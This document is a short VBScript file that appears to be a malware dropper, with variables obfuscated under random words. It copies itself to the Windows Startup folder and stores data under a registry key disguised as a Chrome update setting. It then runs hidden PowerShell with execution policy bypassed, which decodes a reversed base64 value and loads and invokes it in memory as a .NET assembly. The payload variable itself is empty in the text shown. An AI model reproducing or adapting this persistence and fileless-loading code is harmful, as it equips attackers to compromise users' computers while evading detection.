On Error Resume Next
For x = 0 To 5
     WScript.Sleep(1000)
   Next


Set pituri = CreateObject("Wscript.Shell") 
Set constantan = CreateObject("Scripting.FileSystemObject")

 unpreventable = pituri.SpecialFolders("Startup") & "\DILEMA.vbs" 
illwiller = constantan.GetAbsolutePathName(wscript.scriptfullname)
biischiadic = "HKCU\SOFTWARE\Chrome\Updates" 


if pituri.RegRead(biischiadic) <> neurocrine then
pituri.RegWrite biischiadic, neurocrine 
end if


aphanozygous = "powershell -noexit -exec bypass -window 1 -Command Copy-Item '" & illwiller  & "' '" & unpreventable  & "';  $crockeryware = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $crockeryware = -join $crockeryware[-1..-$crockeryware.Length];[<##>AppDomain<##>]::<##>('subanconealurrentDomain'.replace('subanconeal','C'))<##>.<##>('Browningoad'.replace('Browning','L'))([Convert]::FromBase64String($crockeryware))<##>.<##>('CavalierintryPoint'.replace('Cavalieri','E'))<##>.<##>('Incleistotheciumoke'.replace('cleistothecium','v'))($Null,$Null)<##>;"  

pituri.Run aphanozygous, 0, False